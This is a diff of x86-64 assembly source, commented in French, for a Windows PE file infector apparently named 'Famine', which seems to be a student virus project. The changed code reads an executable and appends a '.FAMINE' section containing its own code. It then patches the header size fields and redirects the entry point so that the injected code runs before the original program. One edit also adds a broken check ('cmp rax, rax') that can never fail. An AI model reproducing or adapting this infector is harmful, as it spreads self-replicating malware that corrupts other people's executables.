@@ -107,14 +107,14 @@ TMP_1 db 'C:\Users\moi\AppData\Local\Temp\test\*',0h
 TMP_1_NAME db 'C:\Users\moi\AppData\Local\Temp\test\',0h
 SECTION_NAME db '.FAMINE',0
 ; rbp
-; 88 - 96   : padding
-; 80 - 88	: saved address of entry point
-; 72 - 80   : saved r10
-; 64 - 72   : saved rdi
+; 80 - 88   : padding
+; 72 - 80   : saved address of entry point
+; 64 - 72   : saved r10
 ; 60 - 64	: size_of_main 
 ; 56 - 60	: Addresse virtuelle de notre code
-; 48 - 56	: nbr of bytes read 
-; 40 - 48	: rsp - 64 // HeapAlloc ?
+; 52 - 56	; Padding (j'espere que magouin verra jamais ca)
+; 48 - 52	: nbr of bytes read 
+; 40 - 48	: HeapAlloc
 ; 32 - 40	: params
 ; 00 - 32	: shadow
 ; rsp
@@ -130,16 +130,15 @@ handle_file proc ; int handle
 	push rbp
 	push rbx
 	push rsi
+	push rdi
 	push r12
 	push r13
 	push r14
 	push r15
 	mov rbp, rsp
-	sub rsp, 96
+	sub rsp, 88
 
-	mov qword ptr [rsp + 64], rdi
-
-	mov r12, rcx
+	mov r12, rcx ; r12 = handle
 
 	; first parameter already in rcx
 	mov rdx, 0 
@@ -152,14 +151,11 @@ not_nt_get_file_size:
 		call GetFileSize
 end_get_file_size:
 
-	mov r13, rax ; r13 = taille du fichier
-
+	mov r13, rax ; r13 = taille du fichier = GetFileSize(handle, 0)
 	mov rcx, label_fin
 	mov rdx, label_debut
 	sub rcx, rdx
-
-	mov r14, rcx
-	
+	mov r14, rcx ; r14 = Taille de notre code
 	add rcx, rax
 	mov rdi, rcx ; rdi = taille a creer
 
@@ -171,7 +167,7 @@ not_nt_get_process_heap:
 		call GetProcessHeap
 end_get_process_heap:
 
-	mov rcx, rax
+	mov rcx, rax ; rcx = GetProcessHeap()
 	mov rdx, 0
 	mov r8, rdi
 
@@ -183,12 +179,12 @@ not_nt_heap_alloc:
 		call HeapAlloc
 end_heap_alloc:
 
-	mov [rsp + 40], rax
+	mov [rsp + 40], rax ; [rsp + 40] = HeapAlloc(heap, 0, taille du fichier)
+
 	mov word ptr [rax], 5a4dh
-
 	add rax, 2
-	sub r13, 2
-
+	sub r13, 2 ; On a deja lu les deux premiers octets
+	
 	mov rcx, r12
 	mov rdx, rax
 	mov r8, r13
@@ -200,51 +196,53 @@ end_heap_alloc:
 	call proc_nt_read_file
 	jmp end_read_file
 not_nt_read_file:
-		call ReadFile
+		call ReadFile ; ReadFile(handle, buffer, taille_du_fichier, &nombre_doctets_lus, 0)
 end_read_file:
 
 
-	test rax, rax
-	je ret_failure
+	cmp rax, rax ; if (read_file == 0) -> ret_failure
+	jne ret_failure
 
-	test r13, qword ptr [rsp+48]
-	je ret_failure
+	cmp r13d, dword ptr [rsp + 48] ; if (nombre_doctets_lus != taille_du_fichier) -> ret_failure
+	jne ret_failure
 
 	mov rcx, qword ptr [rsp + 40]
 	mov rdx, r13
-	call init_imports ; On fait les imports
+	call init_imports ; init_imports(buffer, taille_du_fichier)
 
-	cmp rax, -1
+	cmp rax, -1 ; si retour = -1 -> ret_failure
 	je ret_failure
 
+	mov rdx, 0
+
 	mov rax, qword ptr [rsp + 40]
-	add rax, 3Ch
-	xor rdx, rdx
-	mov edx, dword ptr [rax] ; on saute le MS DOS header 
+	add rax, 3Ch ; rax = &lfa_new
+	mov edx, dword ptr [rax] ; rdx = lfa_new
 	mov rax, qword ptr [rsp + 40]
-	add rax, rdx
+	add rax, rdx ; rax = buffer + lfa_new = PE Header
 
 	add rax, 6
 	mov cx, word ptr [rax] ; cx = OldNumberOfSections
 	inc word ptr [rax] ; NumberOfSections++
+
 	add rax, 14
 
-	xor rbx, rbx
+	mov rbx, 0
 	mov bx, word ptr [rax]
-		mov r15, rax
-		add r15, 4
-	add rax, rbx
-	add rax, 4 ;  ptr += SizeOfOptionaHeaders + 4
+	add rax, 4
+	mov r15, rax
+	add r15, 4 ;  ; r15 = &SizeOfCode
 
-	xor rbx, rbx
-	mov bx, cx
-	mov rdx, rbx
+	add rax, rbx ; rax = premier_section_header
+	
+	mov rdx, 0
+	mov dx, cx ; rdx = OldNumberOfSections
 
-		mov rbx, rax ; temp
+	mov rbx, rax ; temp
 
 	mov rax, 40
-	imul rdx
-	add rax, rbx ; rax += olDSizeOfOptionalHeaders
+	imul rdx ; rdx:rax = rdx * 40 = OldNumberOfSections * 40 = TailleDesSetions
+	add rax, rbx ; rax = EndroitOuEcrireLaSectionFamine
 
 	mov rbx, qword ptr [SECTION_NAME]
 	mov  [rax], rbx ; on met le nom de la section
@@ -260,10 +258,11 @@ end_read_file:
 	add r8d, r9d
 	or r8d, 0fffh
 	inc r8d
-	mov dword ptr [rsp + 56], r8d
+	mov dword ptr [rsp + 56], r8d ; on sauvegarde la VA de Famine
 	mov dword ptr [rax], r8d ; On met son endroit dans la memoire virtuelle
-	xor rsi, rsi
-	mov esi, r8d
+
+	mov rsi, 0
+	mov esi, r8d ; rsi = VA de famine
 
 	add rax, 4
 	mov rbx, r14
@@ -288,7 +287,7 @@ end_read_file:
 	add rcx, r13
 	lea rdx, label_debut
 	mov r8, r14
-	call ft_memcpy	 ; on ecrit notre code a la fin du buffer
+	call ft_memcpy	 ; on ecrit notre code a la fin du buffer ; ft_memcpy(buffer + tailleDuFichier, label_debut, tailleDeNotreCode)
 
 	mov rcx, fin_main
 	mov rdx, debut_main
@@ -296,58 +295,51 @@ end_read_file:
 	mov dword ptr [rsp + 60], ecx ; On sauvegarde la taille du main
 
 	mov rcx, [rsp + 40]
-		add rcx, r13
-		xor rbx, rbx
-		mov ebx, dword ptr [rsp + 60]
-	add rcx, rbx
+	add rcx, r13
+	mov rbx, 0
+	mov ebx, dword ptr [rsp + 60]
+	add rcx, rbx ; rcx = buffer + tailleDuFichier + tailleDuMain = fin_du_main
 	mov byte ptr [rcx], 0 ; on met MUST EXIT a 0
 
-	add r15, 4
-		mov rbx, r14
-		or rbx, 0ffh
-		inc rbx
-	add dword ptr [r15], ebx ; On  augment le champ SizeOfcode du pe
+	mov rbx, r14
+	or rbx, 0ffh
+	inc rbx
+	add dword ptr [r15], ebx ; SizeOfCode += tailleDeNotreCodeAlignee
 
-	mov qword ptr [rsp + 72], rsi
-
-	add r15, 12
-	xor rbx, rbx
-	mov ebx, dword ptr [r15]
+	add r15, 12 ; r15 = &AddressOfEntryPoint
+	mov rbx, 0
+	mov ebx, dword ptr [r15] ; rbx = AddressOfEntryPoint
 	inc rcx
-	mov qword ptr [rcx], rbx ; On remplace deadbeef par l'entry point
+	mov qword ptr [rcx], rbx ; On remplace l'entry point apres notre main (deadbeef) par l'entry point par defaut
 
-	mov qword ptr [rsp + 80], rbx
+	mov qword ptr [rsp + 72], rbx ; On sauvegarde AddressOfEntryPoint
 
-	mov rsi, qword ptr [rsp + 72]
+	mov eax, dword ptr [rsp + 56] ; rax = VA de famine
+	mov dword ptr [r15], eax ; AddressOfEntryPoint = VA de Famine
 
-	mov rax, debut_main
-	mov rbx, label_debut
-	sub rax, rbx ; rax = label_debut - label_main = 0? 
-
-	add rax, r13
-	mov eax, dword ptr [rsp + 56]
-	mov dword ptr [r15], eax ; on modifie l'entry point par notre main ;            IMPORTANT 
-
-	add r15, 40
+	add r15, 40 ; r15 = &SizeOfImage
 	mov eax, dword ptr [rsp + 56]
 	add eax, 01000h
-	mov dword ptr [r15], eax ; Size of image
+	mov dword ptr [r15], eax ; Size of image += TailleDeFaine paddee a 0x1000 = 0x1000
 
 	mov rax, qword ptr [rsp + 40] ; rax = addresse de heapalloc
 	lea rbx, label_jump_find_first_file_a ; rbx = label jump dan notre memoire
 	lea rcx, label_debut ; rcx = label debut dans notre memoire
-	sub rbx, rcx ; rbx offset
+	sub rbx, rcx ; rbx = offset des jumps dans notre memoire par rapport a notre debut de famine
 
-	add rax, r13 ;  On va jusqu'au label jump create file de notre heapalloc
-	add rax, rbx ; rax
+	add rax, r13 ;
+	add rax, rbx ; On va jusqu'au label jump create file de notre heapalloc
 	add rax, 2 ; on avance jusqu'au parametre du jump dans heapalloc
 
 	mov rbx, rax
-	add rbx, 4 ; rbx = instruction apres le jump dans le heapalloc
-	sub rbx, r13
-	sub rbx, qword ptr [rsp + 40] ; rbx = offset d'apres le jump (offet debut)
-	add ebx, esi ; ebx = rva debut
-	sub edi, ebx
+	add rbx, 4 ; rbx = addresse_apres_le_premier_jump
+	sub rbx, r13 ; rbx -= tailleDuFichier
+	sub rbx, qword ptr [rsp + 40] ; rbx -= buffer ; (Ca devient un offset par rapport au debut du fichier)
+	add ebx, esi ; ebx += Va de famine
+	sub edi, ebx ; ebx -= VA de fin de la ft
+
+	; en resume, rbx = OffsetApresLeJumpDansLeBuffer - buffer - tailleDuFichierOriginal + VA de famine - VAFinDeLaFt
+					;	= VA du jump - VA de la ft
 
 	mov rcx, 0
 
@@ -366,7 +358,7 @@ debut_boucle_ecriture_dans_jump:
 	sub rbx, rdx
 	add ebx, esi
 
-	mov rcx, qword ptr [rsp + 80]
+	mov rcx, qword ptr [rsp + 72]
 	sub ecx, ebx
 
 	lea rax, label_avant_jump
@@ -429,7 +421,6 @@ not_nt_write_file_2:
 end_write_file_2:
 
 ret_failure:
-	mov rdi, qword ptr [rsp + 64]
 
 	mov rsp, rbp
 
@@ -437,6 +428,7 @@ ret_failure:
 	pop r14
 	pop r13
 	pop r12
+	pop rdi
 	pop rsi
 	pop rbx
 
@@ -846,7 +838,7 @@ apres:
 	mov rax, qword ptr [rsp + 48]
 
 	add rax, 8ch ; Champ import directory rva
-	xor rbx, rbx
+	mov rbx, 0
 	mov ebx, dword ptr [rax] ; on met la rva d'import directory dans rbx
 	sub rbx, rcx
 	add rbx, rdx ; on transforme ca en file offset
@@ -863,7 +855,7 @@ debut_boucle_init_imports_find_kernel32:
 	jmp fin_error
 
 is_ok:
-	xor rbx, rbx
+	mov rbx, 0
 	mov ebx, dword ptr [rax]
 	sub rbx, qword ptr [rsp + 64]
 	add rbx, qword ptr [rsp + 56]
@@ -884,7 +876,7 @@ fin_boucle_init_imports_find_kernel32:
 	mov rax, qword ptr [rsp + 48]
 	sub rax, 0ch; rax = ddresse de l'import
 
-	xor rbx, rbx
+	mov rbx, 0
 	mov ebx, dword ptr [rax]
 	sub rbx, qword ptr [rsp + 64]
 	add rbx, qword ptr [rsp + 56]
@@ -997,7 +989,7 @@ search_section proc
 	push r15
 	mov rbp, rsp
 	sub rsp, 16
-	xor rbx, rbx
+	mov rbx, 0
 
 	mov dword ptr [rsp], 0
 	mov dword ptr [rsp + 8], 0
@@ -1007,7 +999,7 @@ search_section proc
 	mov word ptr [rsp + 16], bx
 
 	add	rcx, 8ah
-	xor rbx, rbx
+	mov rbx, 0
 	mov ebx, dword ptr [rcx]
 
 	sub rcx, 8ch
@@ -1073,12 +1065,12 @@ get_idata_values proc ; get_idata_values(void *file_header, int taille_du_fichie
 	; sections = file header + sizeof(file_header) + SizeOfOptionalHeader
 	mov rax, rcx
 	add rax, 10h
-	xor rbx, rbx
+	mov rbx, 0
 	mov bx, word ptr [rax]
 	add rax, rbx
 	add rax, 4
 debut_boucle_get_idata:
-	xor rbx, rbx
+	mov rbx, 0
 	mov ebx, 00006174h
 	rol rbx, 32
 	mov rdx, rbx
